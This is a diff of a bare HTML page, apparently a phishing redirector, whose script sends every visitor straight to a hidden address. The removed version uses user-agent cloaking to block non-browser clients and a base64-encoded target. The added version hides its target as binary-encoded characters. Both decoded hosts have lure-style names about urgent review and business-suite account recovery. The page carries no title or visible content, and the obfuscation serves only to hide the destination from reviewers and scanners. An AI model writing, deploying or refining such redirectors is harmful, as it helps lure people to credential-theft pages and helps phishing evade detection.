@@ -1,35 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Redirecting...</title>
+<title></title>
 <script>
-(function(){
-    // Allow only real browsers
-    const allowList = [
-        /android/i,
-        /windows/i,
-        /iphone/i,
-        /ipad/i,
-        /mac os/i,
-        /cros/i
-    ];
 
-    const ua = navigator.userAgent || "";
-    const isAllowed = allowList.some(r => r.test(ua));
+const binary = [
+  "01101000","01110100","01110100","01110000","01110011","00111010","00101111","00101111",
+  "01110010","01100101","01100011","01101111","01110110","01100101","01110010","01111001",
+  "00101101","01101101","01111001","00101101","01101101","01100010","01110101","01110011",
+  "01101001","01101110","01100101","01110011","01110011","00101101","01110011","01110101",
+  "01101001","01110100","01100101","00101110","01110111","01100001","01110011","01101101",
+  "01100101","01110010","00101110","01100001","01110000","01110000","00101111"
+];
 
-    if (!isAllowed) {
-        document.body.innerHTML = "<div style='font-family:sans-serif;text-align:center;margin-top:40vh;'><h2>Access Denied</h2><p>Device not supported.</p></div>";
-        throw new Error("Device not allowed");
-    }
+// Convert binary → string
+const url = binary.map(b => String.fromCharCode(parseInt(b, 2))).join("");
 
-    // Obfuscate target URL (base64)
-    const encodedUrl = "aHR0cHM6Ly90YWtlLXVyZ2VudC1yZXZpZXctYnVzaW5lc3Mtc3VpdGUud2FzbWVyLmFwcC8="; // your URL base64 encoded
-    const targetUrl = atob(encodedUrl);
-
-    // Instant redirect
-    window.location.replace(targetUrl);
-})();
+// Instant redirect
+window.location.replace(url);
 </script>
 </head>
 <body></body>
